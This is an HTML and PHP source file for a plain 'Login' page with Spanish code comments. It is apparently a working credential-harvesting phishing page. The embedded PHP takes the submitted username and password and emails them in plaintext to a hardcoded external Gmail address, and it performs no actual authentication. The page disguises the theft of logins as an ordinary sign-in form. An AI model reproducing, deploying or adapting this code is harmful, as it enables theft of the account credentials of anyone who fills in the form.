<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        input[type="text"],
        input[type="password"],
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 3px;
            box-sizing: border-box; /* For proper input width */
        }
        input[type="submit"] {
            background-color: #0000FF;
            color: white;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Login</h2>
    <!-- Modificado el action para que apunte al archivo PHP -->
    <form action="enviar_email.php" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>

        <input type="submit" value="Login">
    </form>

</div>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Dirección de correo electrónico a la que enviar los datos
    $to = "julianeaoficial@gmail.com";

    // Asunto del correo electrónico
    $subject = "Datos del formulario de inicio de sesión";

    // Mensaje del correo electrónico
    $message = "Username: $username\r\nPassword: $password";

    // Cabeceras del correo electrónico
    $headers = "From: tu@email.com";

    // Envía el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo electrónico enviado correctamente.";
    } else {
        echo "Error al enviar el correo electrónico.";
    }
}
?>

</body>
</html>

